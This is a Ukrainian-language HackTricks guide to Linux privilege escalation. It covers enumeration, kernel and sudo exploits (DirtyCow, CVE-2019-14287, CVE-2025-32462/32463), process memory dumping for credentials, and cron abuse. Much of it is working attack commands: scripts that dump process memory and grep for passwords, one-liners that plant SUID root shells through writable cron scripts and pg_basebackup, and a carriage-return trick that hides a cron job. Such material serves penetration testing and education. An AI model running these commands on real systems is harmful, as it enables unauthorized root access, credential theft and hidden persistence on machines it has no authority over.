# Підвищення привілеїв у Linux

{{#include ../../../banners/hacktricks-training.md}}

Щоб отримати ширший контекст і ознайомитися з історичними методами збору інформації, порівняйте ресурси g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation і linux-private-i, перелічені в розділі посилань.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Інформація про систему

### Інформація про ОС

Почнімо збирати інформацію про запущену ОС.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Шлях

Якщо ви **маєте права на запис до будь-якої папки зі змінної `PATH`**, можливо, ви зможете підмінити деякі бібліотеки або бінарні файли:

```bash
echo $PATH
```

### Інформація про середовище

Цікава інформація, паролі або API-ключі у змінних середовища?

```bash
(env || set) 2>/dev/null
```

### Експлойти ядра

Перевірте версію ядра та з’ясуйте, чи існує експлойт, який можна використати для підвищення привілеїв.

У [розділі Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) зібрано приклади локального підвищення привілеїв і посилання на докладніші матеріали про ядро Linux у розділі Binary Exploitation. Перш ніж тестувати приклад, перевірте, чи відповідають йому ваша збірка та конфігурація.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Можна знайти список вразливих ядер і деякі вже **скомпільовані експлойти** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) і [sploits з exploitdb](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Інші сайти, де можна знайти **скомпільовані експлойти**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб отримати всі версії вразливих ядер із цього сайту, можна виконати:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Інструменти, які можуть допомогти знайти kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (запустіть НА цільовій системі, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію kernel у Google**: можливо, ваша версія kernel вказана в описі якогось kernel exploit, і тоді ви знатимете напевно, що цей exploit підходить.

Додаткові техніки експлуатації kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Підвищення привілеїв у Linux — Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Версія sudo

На основі вразливих версій sudo, зазначених у:

```bash
searchsploit sudo
```

За допомогою цього grep можна перевірити, чи є версія sudo вразливою.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

У upstream sudo **від 1.9.14 до 1.9.17** непривілейовані локальні користувачі можуть отримати права root через опцію `--chroot`, коли sudo завантажує `/etc/nsswitch.conf` з каталогу, контрольованого користувачем; upstream виправив це в **1.9.17p1**. Перевірте кожен виконуваний файл sudo з root-setuid у відповідних шляхах, оскільки `sudo -V` повідомляє лише про бінарний файл, вибраний через `PATH`. Дистрибутивні пакети можуть включати виправлення з upstream, не змінюючи рядок версії, тому також перевірте статус пакета від постачальника. Див. [рекомендацію супроводжувача sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для експлуатації цієї [вразливості](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском експлойта переконайтеся, що ваша версія `sudo` вразлива та підтримує функцію `chroot`.

Докладніше див. оригінальну [рекомендацію щодо вразливості](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Обхід правил sudo на основі хоста (CVE-2025-32462)

У upstream sudo **від 1.8.8 до 1.9.17** під час перевірки правил sudoers на основі хоста може використовуватися **ім’я хоста, вказане користувачем** у `sudo -h <host>`, а не **справжнє ім’я хоста**; upstream виправив це в **1.9.17p1**. Користувач усе ще має відповідати запису sudoers для вибраного хоста. Перевірте виправлення від постачальника та альтернативні бінарні файли sudo, а також локальну політику. Див. [рекомендацію супроводжувача sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Вимоги:
- Вразлива версія sudo
- Правила sudoers для конкретного хоста (хост не збігається з поточним і не дорівнює `ALL`)

Приклад шаблону sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Експлуатація шляхом підміни дозволеного хоста:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Якщо розв’язання вибраного імені блокується, перевірте, як це ім’я розв’язується на хості. Сам факт наявності імені в журналі або файлі конфігурації не означає, що його можна розв’язати, а для зміни `/etc/hosts` зазвичай потрібен привілейований доступ на запис.

#### sudo < v1.8.28

Цей [обхід Runas UID в upstream](https://ubuntu.com/security/CVE-2019-14287) вимагає наявності ефективного правила sudo, яке дозволяє виконувати команду від імені будь-якого користувача, крім root, наприклад `(ALL, !root) /bin/bash`. Користувач також має мати дозвіл на використання цього правила, зокрема пройти автентифікацію, якщо вона потрібна. Перевірте рекомендації постачальника щодо встановленого пакета: виправлення було перенесено у випуски, відображувана upstream-версія яких усе ще нижча за 1.8.28. Саме по собі правило `!root` або стара версія не підтверджують наявність вразливості. Не перевіряйте привілейовану команду під час пасивного збору даних.

```
sudo -u#-1 /bin/bash
```

### Перевірка підпису Dmesg не вдалася

Перегляньте машину **smasher2 box of HTB**, щоб побачити **приклад** того, як можна використати цю вразливість.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Додаткове дослідження системи

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Перелік можливих засобів захисту

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Якщо ви перебуваєте всередині контейнера, почніть із наведеного нижче розділу про безпеку контейнерів, а потім перейдіть до сторінок про зловживання конкретними середовищами виконання:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Диски

Перевірте, **що змонтовано й відмонтовано**, де й чому. Якщо щось відмонтовано, можна спробувати змонтувати це й перевірити на наявність приватної інформації.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Корисне програмне забезпечення

Перелічіть корисні бінарні файли

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Також перевірте, чи **встановлено будь-який компілятор**. Це корисно, якщо потрібно використати kernel exploit, оскільки рекомендується скомпілювати його на машині, де ви збираєтеся його використовувати (або на схожій).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Встановлене вразливе програмне забезпечення

Перевірте **версії встановлених пакетів і служб**. Можливо, встановлено стару версію Nagios (наприклад), яку можна використати для підвищення привілеїв…\
Рекомендується вручну перевірити версії підозрілішого встановленого програмного забезпечення.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Якщо у вас є SSH-доступ до машини, ви також можете скористатися **openVAS**, щоб перевірити, чи встановлено на ній застаріле та вразливе програмне забезпечення.

> [!NOTE] > _Зауважте, що ці команди покажуть багато інформації, більша частина якої буде марною. Тому рекомендується використовувати такі програми, як OpenVAS або подібні, які перевірять, чи є вразливими до відомих експлойтів версії встановленого програмного забезпечення_

## Процеси

Перегляньте, **які процеси** виконуються, і перевірте, чи не має якийсь процес **більше привілеїв, ніж повинен** (наприклад, чи не виконується tomcat від імені root?).

```bash
ps aux
ps -ef
top -n 1
```

Завжди перевіряйте, чи запущені [**electron/cef/chromium debuggers**: їх можна використати для підвищення привілеїв](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої права на бінарні файли процесів** — можливо, ви зможете перезаписати чийсь файл.

### Ланцюжки «батьківський процес — дочірній процес» між різними користувачами

Дочірній процес, запущений від **іншого користувача**, ніж його батьківський процес, не обов’язково є шкідливим, але це корисний **сигнал для первинної перевірки**. Деякі переходи очікувані (`root` запускає сервісного користувача, менеджери входу створюють процеси сеансу), але незвичні ланцюжки можуть виявити обгортки, допоміжні засоби налагодження, механізми закріплення або слабкі межі довіри під час виконання.

Швидка перевірка:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Якщо ви виявили неочікуваний ланцюжок, перевірте командний рядок батьківського процесу та всі файли, що впливають на його поведінку (`config`, `EnvironmentFile`, допоміжні скрипти, робочий каталог, аргументи, доступні для запису). У кількох реальних шляхах privesc дочірній процес сам не був доступний для запису, але таким був **конфігураційний файл, яким керував батьківський процес**, або ланцюжок допоміжних скриптів.

### Видалені виконувані файли та видалені відкриті файли

Артефакти часу виконання часто залишаються доступними **після видалення**. Це корисно як для підвищення привілеїв, так і для відновлення доказів із процесу, у якого вже відкриті конфіденційні файли.

Перевірте наявність видалених виконуваних файлів:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Якщо `/proc/<PID>/exe` вказує на `(deleted)`, процес і досі виконує старий образ бінарного файла з пам’яті. Це вагома причина для розслідування, оскільки:

- видалений виконуваний файл може містити цікаві рядки або облікові дані
- запущений процес може й досі надавати корисні файлові дескриптори
- видалений привілейований бінарний файл може свідчити про нещодавнє втручання або спробу приховати сліди

Зберіть список видалених відкритих файлів у системі:

```bash
lsof +L1
```

Якщо знайдете цікавий дескриптор, відновіть його безпосередньо:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Це особливо цінно, коли процес досі має відкритий видалений секрет, скрипт, експорт бази даних або файл із прапорцем.

### Моніторинг процесів

Для моніторингу процесів можна використовувати такі інструменти, як [**pspy**](https://github.com/DominicBreuker/pspy). Це може бути дуже корисно для виявлення вразливих процесів, які часто запускаються або запускаються за виконання певного набору умов.

#### Linux ProcMon під sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) може відстежувати вибрані процеси й системні виклики та зберігати трасування в SQLite. Якщо `sudo -l` дозволяє запускати команду `procmon` із правами root без обмежень, подумайте, чи може вона спостерігати за введенням або виведенням даних процесу іншого користувача. Цей дозвіл лише підказує, що варто перевірити: важливі підтримка трасувальника, чинна політика та активність відповідного процесу. Файли трасування можуть містити секрети, тому уважно перевіряйте дозволені до перегляду експорти й не збирайте дані сторонніх процесів.

### Пам'ять процесів

Деякі служби сервера зберігають **облікові дані у відкритому тексті в пам'яті**.\
Зазвичай для читання пам'яті процесів, що належать іншим користувачам, потрібні **права root**, тому це зазвичай корисніше, коли ви вже маєте права root і хочете знайти інші облікові дані.\
Однак пам'ятайте, що **звичайний користувач може читати пам'ять процесів, якими він володіє**.

> [!WARNING]
> Зауважте, що нині на більшості машин **ptrace за замовчуванням заборонено**, тобто ви не можете дампити інші процеси, що належать вашому непривілейованому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ визначає доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: можна налагоджувати всі процеси, якщо вони мають однаковий uid. Так ptrace працював традиційно.
> - **kernel.yama.ptrace_scope = 1**: можна налагоджувати лише батьківський процес.
> - **kernel.yama.ptrace_scope = 2**: ptrace може використовувати лише адміністратор, оскільки для цього потрібна можливість CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: жоден процес не можна трасувати за допомогою ptrace. Після встановлення цього значення для повторного ввімкнення ptrace потрібне перезавантаження.

Процес із тим самим UID, який на короткий час розблоковує сховище паролів, може становити окрему межу доступу до облікових даних. Якщо трасування дозволено, активний процес, доступний для дампу, може розкрити пароль до сховища через системні виклики введення або пам'ять, хоча сам зашифрований файл сховища залишатиметься захищеним. `ptrace_scope=0` — лише одна з передумов: також мають значення відповідність облікових даних, можливість дампу цільового процесу, інші модулі безпеки Linux і тривалість роботи процесу. Щоб запис зі сховища можна було використати для входу в Unix як root, потрібно окремо перевірити повторне використання облікових даних. Під час звичайного перерахування слід повідомляти про політику та потенційний процес або шляхи до сховища, а не перехоплювати введення чи виводити секрети. Див. [документацію Yama ядра](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) і [перевірки доступу ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Якщо, наприклад, ви маєте доступ до пам'яті служби FTP, то можете отримати Heap і шукати в ньому облікові дані.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Скрипт GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ID процесу файл **maps показує, як пам’ять відображається у віртуальному адресному просторі цього процесу**; він також показує **права доступу для кожного відображеного регіону**. Псевдофайл **mem відкриває безпосередній доступ до пам’яті процесу**. З файла **maps** ми дізнаємося, які **регіони пам’яті доступні для читання**, а також їхні зміщення. Використовуючи цю інформацію, ми **переходимо до потрібних позицій у файлі mem і записуємо всі доступні для читання регіони** у файл.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам’яті системи, а не до віртуальної пам’яті. До віртуального адресного простору ядра можна отримати доступ через /dev/kmem.\
Зазвичай `/dev/mem` доступний для читання лише користувачам **root** і групі **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump для Linux

ProcDump — це переосмислення класичного інструмента ProcDump із набору Sysinternals для Windows, адаптоване для Linux. Завантажте його тут: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Інструменти

Щоб зняти дамп пам’яті процесу, можна скористатися:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну прибрати вимогу root і зняти дамп процесу, яким володієте
- Скрипт A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам’яті процесу

#### Приклад вручну

Якщо ви виявите, що процес автентифікатора запущений:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Ви можете зняти дамп процесу (див. попередні розділи, щоб знайти різні способи дампу пам’яті процесу) та пошукати облікові дані в пам’яті:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **викрадає облікові дані у відкритому тексті з пам’яті** та з деяких **відомих файлів**. Для належної роботи йому потрібні привілеї root.

| Функція                                           | Назва процесу         |
| ------------------------------------------------- | -------------------- |
| Пароль GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (активні FTP-з’єднання)                   | vsftpd               |
| Apache2 (активні сеанси HTTP Basic Auth)          | apache2              |
| OpenSSH (активні SSH-сеанси — використання Sudo)  | sshd:                |

#### Пошукові регулярні вирази/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Заплановані завдання/Cron

### Crontab UI (alseambusher), що працює від root – privesc через вебпланувальник

Якщо вебпанель «Crontab UI» (alseambusher/crontab-ui) працює від root і прослуховує лише loopback, до неї все одно можна отримати доступ через локальне перенаправлення портів SSH і створити привілейоване завдання для підвищення привілеїв.<sup>[[1]](#references)[[4]](#references)</sup>

Типовий ланцюжок
- Знайдіть порт, доступний лише через loopback (наприклад, 127.0.0.1:8000), і realm Basic-Auth за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайдіть облікові дані в операційних артефактах:
  - Резервні копії/скрипти з `zip -P <password>`
  - systemd unit, де задано `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Створіть тунель і увійдіть:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створіть завдання з високими привілеями й негайно запустіть його (створює SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використайте це:
```bash
/tmp/rootshell -p   # root shell
```

Посилення безпеки
- Не запускайте Crontab UI від root; використовуйте окремого користувача з мінімальними правами
- Прив’яжіть до localhost і додатково обмежте доступ за допомогою firewall/VPN; не використовуйте повторно паролі
- Не вбудовуйте секрети у файли unit; використовуйте сховища секретів або EnvironmentFile, доступний лише root
- Увімкніть аудит і логування запусків завдань на вимогу

Перевірте, чи є вразливими заплановані завдання. Можливо, ви зможете скористатися скриптом, який виконується від root (уразливість із wildcard? Можна змінити файли, якими користується root? Використати symlink? Створити певні файли в каталозі, яким користується root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Якщо використовується `run-parts`, перевірте, які назви будуть фактично виконані:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Це допомагає уникнути хибних спрацьовувань. Каталог із періодичними завданнями, доступний для запису, корисний лише тоді, коли ім’я вашого payload відповідає локальним правилам `run-parts`.

### Шлях Cron

Наприклад, у _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис у /home/user_)

Якщо в цьому crontab користувач root намагається виконати команду або скрипт, не задаючи шлях. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді ви можете отримати оболонку root за допомогою:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron із використанням скрипту з підстановочним символом (Wildcard Injection)

Якщо скрипт виконується від імені root і містить «**\***» у команді, це можна використати, щоб спричинити неочікувані наслідки (наприклад, privesc). Приклад:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Якщо перед wildcard вказано шлях, наприклад** _**/some/path/\***_ **, він не є вразливим (навіть** _**./\***_ **не є).**

На наступній сторінці описано інші трюки експлуатації wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Ін’єкція через арифметичне розширення Bash у парсерах журналів cron

Арифметичний вираз Bash може інтерпретувати ненадійний текст як вираз. У певних контекстах Bash індекс масиву всередині такого виразу може виконати підстановку команди. Якщо привілейований cron/parser поміщає контрольований зловмисником текст журналу в таке арифметичне порівняння, підстановка може виконатися з правами цього парсера.<sup>[[22]](#references)</sup> Це залежить від конкретного виразу Bash і його версії; сам по собі рядок `$(...)0` у розгорнутій змінній не є надійною демонстрацією повторного обчислення.

Вхідні дані також можуть надходити з метаданих файлу або іншого поля, прочитаного з доступного для запису користувачем розташування. Наприклад, привілейований скрипт очищення, який зчитує тег `Producer` зображення та порівнює його за допомогою `[[ "$producer" -eq "expected" ]]`, виконує арифметичне порівняння, навіть якщо змінну взято в лапки. З’ясуйте, від чийого імені виконується заплановане завдання, які файли можуть містити цей тег, які перетворення відбуваються до порівняння та як саме поводиться Bash. Для текстових міток використовуйте порівняння рядків; для чисел перед арифметичними операціями перевіряйте, що вхідні дані містять лише десяткові цифри. Див. [правила арифметики Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Типовий вразливий шаблон:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Безпечна локальна перевірка поведінки механізму доступу до елемента масиву (без привілейованого процесу чи зміни файлів):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

З’ясуйте, який саме скрипт запускається за розкладом і який буквальний шлях до файлу він відкриває. Навіть якщо сам файл журналу недоступний для запису, користувач, який може записувати дані до його батьківського каталогу без sticky bit і переходити до нього, може замінити запис каталогу; `namei -l` допоможе розрізнити ці права. Інший доступний для запису шлях до журналу, недоступний для читання планувальник або парсер, який ніколи не обчислює це поле як арифметичний вираз Bash, не підтверджують наявність цього шляху.

### Перезапис cron-скрипта та symlink

Якщо ви **можете змінити cron-скрипт**, який запускається від root, то дуже легко отримати shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Якщо скрипт, який виконується від імені root, використовує **каталог, до якого у вас є повний доступ**, можливо, буде корисно видалити цю папку й **створити symlink на іншу папку**, у якій міститься скрипт, контрольований вами.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Перевірка symlink і безпечніша робота з файлами

Перевіряючи привілейовані скрипти/бінарні файли, які читають або записують файли за шляхом, з’ясуйте, як вони обробляють посилання:

- `stat()` переходить за symlink і повертає метадані цільового об’єкта.
- `lstat()` повертає метадані самого посилання.
- `readlink -f` і `namei -l` допомагають визначити кінцеву ціль і показують дозволи для кожного компонента шляху.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Для захисників і розробників безпечніші способи протидії трюкам із symlink:

- `O_EXCL` з `O_CREAT`: завершити операцію з помилкою, якщо шлях уже існує (блокує попередньо створені зловмисником посилання/файли).
- `openat()`: працювати відносно дескриптора файлу довіреного каталогу.
- `mkstemp()`: атомарно створювати тимчасові файли із безпечними дозволами.

### Власноруч підписані cron-бінарники з доступними для запису корисними навантаженнями
Звичайний користувач, який може записувати саме той бінарник, що запускається root-завданням cron, може перетнути межу привілеїв, але спеціальна перевірка підпису може відхилити непідписану заміну. У задокументованому випадку ELF-файл, власником якого був root, мав режим `0760`, що дозволяло учаснику його групи записувати до нього, а власнику root — виконувати його. Видиме трасування процесів показало, що `objcopy` витягував `.text_sig` перед тим, як завдання запускало бінарник; повний скрипт перевірки прочитати не вдалося.<sup>[[2]](#references)</sup>

Успішну заміну підписали за допомогою витеклого приватного матеріалу для підпису, використавши підписувач ELF. У [документації формату](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) описано секцію підпису, утворену на основі `.text` виконуваного файлу. Саме додавання сертифіката або відповідного рядка до `.text_sig`, як показано, не гарантує проходження невидимої перевірки. Перш ніж робити висновок, що бінарник із доступом для запису можна експлуатувати, перевірте фактичний шлях, який запускається за розкладом, ефективний доступ на запис, запуск від імені root і правила перевірки підпису. Секція `.text_sig` сама по собі є лише приводом для перевірки.

### Часті cron-завдання

Ви можете відстежувати процеси, щоб знаходити ті, які запускаються кожні 1, 2 або 5 хвилин. Можливо, це можна використати для підвищення привілеїв.

Наприклад, щоб **відстежувати кожні 0.1 с протягом 1 хвилини**, **відсортувати за кількістю виконань команд у порядку зростання** й видалити команди, які виконувалися найчастіше, можна зробити так:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Також можна використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (він відстежуватиме та показуватиме кожен запущений процес).

### Резервні копії від root, що зберігають встановлені атакувальником біти режиму (pg_basebackup)

Якщо cron від root запускає `pg_basebackup` (або будь-яке рекурсивне копіювання) для каталогу бази даних, у який ви можете записувати, можна підкласти **SUID/SGID binary**, який буде скопійовано виводом резервної копії як **root:root** із тими самими бітами режиму.<sup>[[26]](#references)</sup>

Типовий порядок пошуку (від імені користувача БД із низькими привілеями):
- Скористайтеся `pspy`, щоб виявити cron від root, який щохвилини запускає щось на кшталт `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Переконайтеся, що ви маєте права на запис у вихідний кластер (наприклад, `/var/lib/postgresql/14/main`), а каталог призначення (`/opt/backups/current`) після виконання завдання належить root.

Експлуатація:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Це працює, оскільки `pg_basebackup` зберігає біти режиму файлів під час копіювання кластера; коли його запускає root, файли призначення отримують **власника root + вибрані атакувальником біти SUID/SGID**. Будь-яка подібна привілейована процедура резервного копіювання/копіювання, яка зберігає дозволи й записує файли у виконуване розташування, є вразливою.

### Невидимі cron jobs

Можна створити cronjob, **додавши символ повернення каретки після коментаря** (без символу нового рядка), і cron job працюватиме. Приклад (зверніть увагу на символ повернення каретки):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

